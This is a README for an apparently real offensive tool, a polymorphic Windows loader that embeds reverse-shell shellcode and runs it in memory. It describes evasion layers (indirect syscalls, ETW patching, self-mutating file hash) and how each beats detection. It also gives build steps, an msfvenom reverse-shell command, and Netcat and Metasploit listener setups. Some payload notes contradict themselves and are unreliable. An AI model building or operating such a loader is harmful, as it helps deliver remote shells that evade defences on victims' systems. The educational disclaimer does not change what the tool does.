# GeniCrypter — Polymorph

A Rust-based **polymorphic PE loader** for Windows x64. It embeds a raw reverse-shell shellcode into a freshly compiled stub, executes it via indirect syscalls, and rewrites its own file signature on every run so no two on-disk copies are identical.

![VirusTotal scan](../resources/hidememe.jpg)

## Table of Contents

- [Features](#features)
- [Architecture](#architecture)
- [Engine pipeline](#engine-pipeline)
- [Stub runtime flow](#stub-runtime-flow)
- [Requirements](#requirements)
- [Installation](#installation)
- [Usage](#usage)
- [Evasion Layers](#evasion-layers)
- [Limitations](#limitations)
- [Security Notes](#security-notes)
- [Disclaimer](#disclaimer)

## What This Project Does

The repository contains two crates:

| Crate | Role | Runs on |
|---|---|---|
| ``engine`` | zCLI tool. Reads a shellcode file, injects it into the stub crate, compiles the stub, and copies the result to the output path. | Build machine (Windows) |
| ``stub`` | The final binary. Embeds the shellcode at compile time, runs it in memory, and self-mutates its .counter section on every execution. | Target machine (Windows) |

```
engine (polymorph)                      stub (template)
      │                                     │
      │  --payload reverse_shell.bin        │
      ├────────────────────────────────────►│
      │  writes stub/shellcode.bin          │
      │  cargo build --release              │
      │  copies stub.exe → output.exe       │
      │                                     │
      ▼                                     ▼
   polymorphic.exe  =  stub + embedded shellcode
```

## Features

#### Engine

- **Payload injection:** copies the user-supplied shellcode into ``stub/shellcode.bin`` before building, so the stub embeds it via ``include_bytes!``.
- **Size limit:** rejects payloads larger than 1 MB (configurable in ``parse_args``).
- **Automatic build:** runs ``cargo build --release`` inside the stub crate and captures errors.
- **Output naming:** defaults to ``polymorphic.exe`` next to the payload if ``--output`` is not given.
- **Clean logging:** colored info/ok/error messages via the ``pkg`` module.

#### Stub 

- Compile-time embedding: shellcode is baked into the binary at link time. No external files, no runtime drops.
- Self-mutating signature: on every run, ``bump_counter`` overwrites the ``.counter`` PE section with 8 random bytes and swaps the binary via ``self-replace.`` The file hash changes on every execution.
- Indirect syscalls: ``NtAllocateVirtualMemory``, ``NtProtectVirtualMemory``, and ``NtCreateThreadEx`` are invoked through ``dinvoke_rs``'s ``execute_syscall!`` macro, bypassing user-mode ``ntdll`` hooks.
- ETW patching: before the shellcode runs, ``patch_etw`` resolves ``EtwEventWrite`` in ``ntdll.dll`` and overwrites its first byte with a single ``RET`` (``0xC3``), silencing all user-mode ETW providers in the process. The page is temporarily flipped to ``PAGE_READWRITE`` with an indirect ``NtProtectVirtualMemory`` call, then restored to its original protection.
- Thread lifetime wait: ``WaitForSingleObject(thread, INFINITE)`` keeps the process alive exactly as long as the shellcode runs.
- Optional GUI subsystem: ``#![windows_subsystem = "windows"]`` can be uncommented to hide the console window.

## Architecture

```
polymorph/
├── engine/                  # the `polymorph` CLI
│   ├── src/
│   │   ├── main.rs          # pipeline: write_payload → build_stub → copy
│   │   ├── parser.rs        # clap CLI definition
│   │   └── pkg.rs           # logging, validation helpers
│   └── Cargo.toml
└── stub/                    # the loader — compiled fresh for every payload
    ├── src/
    │   ├── main.rs          # counter, ETW patch, indirect-syscall loader
    │   └── logger.rs        # colored log helpers
    ├── shellcode.bin        # written by the engine before each build
    ├── Cargo.toml
    └── (no build.rs — placeholder file committed for standalone builds)
```

## Engine pipeline

1. ``parse_args`` reads ``--payload`` and ``--output``, validates size.
2. ``write_payload`` copies the payload to ``stub/shellcode.bin``.
3. ``build_stub`` runs ``cargo build --release`` in ``stub/``.
4. ``run`` copies ``stub/target/release/stub.exe`` to the requested output path.

## Stub runtime flow

1. ``bump_counter`` — parses its own PE with ``hexspell``, finds the ``.counter`` section, fills it with 8 random bytes from ``getrandom``, writes a patched copy to ``stub.exe.new``, and schedules ``self-replace`` to swap it in after exit.
2. execute_shellcode:
    - ``patch_etw`` → resolves ``EtwEventWrite`` in ``ntdll.dll``, makes the page writable, writes ``RET`` (``0xC3``), restores the original protection. User-mode ETW is now silenced for the process.
    - ``NtAllocateVirtualMemory`` → RW buffer.
    - ``memcpy`` shellcode into the buffer.
    - ``NtProtectVirtualMemory`` → RX.
    - ``NtCreateThreadEx`` → start a thread at the buffer address.
    - ``WaitForSingleObject(thread, INFINITE)`` → stay alive for the shellcode's lifetime.

## Requirements

- **Windows 10/11 x64** (build and run).
- **Rust stable** (MSVC toolchain: x86_64-pc-windows-msvc).
- **Visual Studio Build Tools** with the "Desktop development with C++" workload.
- A stageless x64 shellcode as payload (see Payload).

The stub depends on:
```toml
[dependencies]
busywork = "0.1.0"
colored = "3.1.1"
dinvoke_rs = "0.2.2"
getrandom = "0.4.3"
hexspell = "1.0"
self-replace = "1.5"
windows = { version = "0.62.2", features = ["Win32_System_Memory", "Win32_Foundation"] }
```

``dinvoke_rs`` pulls in ``dinvoke``, ``dinvoke_data``, and ``manualmap``. The ``windows`` version must match what ``dinvoke_rs`` uses, or the ``HANDLE`` types won't be compatible (see Troubleshooting).

## Installation

```bash
git clone https://github.com/zakariasalhi12/GeniCrypter.git
cd GeniCrypter\polymorph
cargo build --release
```
The engine binary lands at ``polymorph\engine\target\release\engine.exe`` (or ``polymorph.exe``, depending on your [[bin]] name).

## Usage

```powershell
.\engine.exe --help
```

```powershell
Polymorphic Program Usage:
  --payload <reverse-shell-code>   Embed the reverse shell payload.
  --output <output-binary>         Specify the name of the encrypted binary file.
```

#### Generate a polymorphic binary

```powershell
.\engine.exe --payload C:\path\to\reverse_shell.bin --output C:\path\to\polymorphic.exe
```

#### Ouput :

```powershell
[*] Payload written to stub/shellcode.bin (1024 bytes)
[*] Stub built successfully
[+] Polymorphic binary generated successfully as "C:\path\to\polymorphic.exe".
```

### Run it

```powershell
.\polymorphic.exe
```

On the first run, the stub:
- Rewrites its ``.counter`` section with random bytes (file hash changes).
- Allocates, copies, and executes the shellcode in a new thread.
- Waits until the shellcode thread exits.

If the shellcode is a reverse shell and a listener is running, the session connects. If not, the stub stays alive until the shellcode thread terminates.

### Payload
The stub expects **raw shellcode**, not a PE. It must be **x64**.

### Generate with msfvenom

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f raw -o shellcode.bin
```

- ``shell_reverse_tcp`` (underscore) = stageless. Netcat works.
- ``meterpreter_reverse_tcp`` = staged. Requires the Metasploit ``multi/handler``.
- ``EXITFUNC=thread`` is not recommended — it has a known bug that crashes x64 payloads on failed connect (see Troubleshooting).

### Catch it
With Netcat (stageless only):
```bash
ncat -lvnp 4444
```
With Metasploit (staged or stageless):
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
exploit
```

## Evasion Layers

| Layer | What it defeats | Limitation |
|---|---|---|
| indirect syscalls (``NtAllocateVirtualMemory``, etc.) | User-mode ``ntdll`` hooks | Kernel-mode ETW and kernel callbacks still fire |
| ETW patching (``EtwEventWrite`` → ``RET``) | User-mode ETW providers (``.NET``, ``AMSI``-adjacent telemetry, ``Windows Defender`` user-mode events) | Kernel-mode ETW sessions and drivers that emit their own events are unaffected; patching ``ntdll`` is itself a detectable integrity change |
| W^X allocation (RW → RX) | "RWX page" heuristic | Private executable memory is still visible to memory scanners |
| ``.counter`` self-mutation | Static file-hash signatures | Behavioral detection (file writes to own exe) fires; ``self-replace`` triggers file-integrity monitoring |
| Compile-time embedding` | Disk-drop signatures | The payload is visible in the binary's ``.rdata`` |

**This is not a general-purpose evasion tool**. It demonstrates how these techniques work. Modern EDR uses behavioral detection, memory diffing, and kernel callbacks — none of which are defeated by the layers above. See Limitations.

## Limitations

- **Windows x64 only.** The stub uses ``dinvoke_rs``, Windows NT syscalls, and ``hexspell``'s PE parser. No x86, no Linux, no macOS.
- **Payload must fit in memory as-is.** No compression or decompression. A 1 MB limit is enforced by the engine.
- ``self-replace`` schedules the swap.** On Windows, the running ``.exe`` is locked, so the swap happens after the process exits. The hash changes on the next run, not the current one. If the shellcode calls ``ExitProcess``, the swap completes immediately. If it stays connected, the swap waits until the session ends.
- **AMSI is not patched.** If you later add PowerShell or .NET to the payload, AMSI scans will still run. ETW is patched, but AMSI is a separate interface.
- **ETW patching only silences user-mode providers.** ``patch_etw`` overwrites ``EtwEventWrite`` in the local ``ntdll.dll``; kernel-mode ETW sessions, threat-intelligence providers, and kernel callbacks still receive events. The one-byte patch also leaves ``ntdll``'s code modified in memory, which memory-integrity scanners can flag.
- **Antivirus will flag it.** The combination of self-modification, indirect syscalls, and a reverse-shell payload is a textbook malware signature. Test only in isolated VMs.

## Security Notes

- **The shellcode is visible in the binary's** ``.rdata``. ``include_bytes!`` embeds it as plain bytes. strings and hex viewers will find it. If you need at-rest protection, AES-encrypt ``shellcode.bin`` before embedding and add a decrypt step in the stub.
- **The** ``.counte``**r self-mutation triggers file-integrity monitoring**. EDR products watch for processes writing to their own executable. ``self-replace`` is a well-known pattern.
- **The reverse shell connects in plaintext.** ``shell_reverse_tcp`` is unencrypted. Use ``shell_reverse_tcp_ssl`` or Meterpreter if you need transport encryption.
- **Do not distribute this tool.** It is for learning how loaders, indirect syscalls, and self-modifying binaries work. Using it against systems you do not own is illegal.

## Disclaimer

This project is intended for educational and authorized security research only. It demonstrates how PE loaders, indirect syscalls, and polymorphic self-modification work under the hood. Do not use it to distribute malware, evade detection on systems you do not own, or otherwise violate applicable laws or terms of service.

The author is not responsible for any misuse or damage caused by this software.
